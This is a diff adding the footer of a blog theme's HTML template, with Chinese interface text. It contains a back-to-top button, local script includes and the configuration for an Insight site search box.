+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
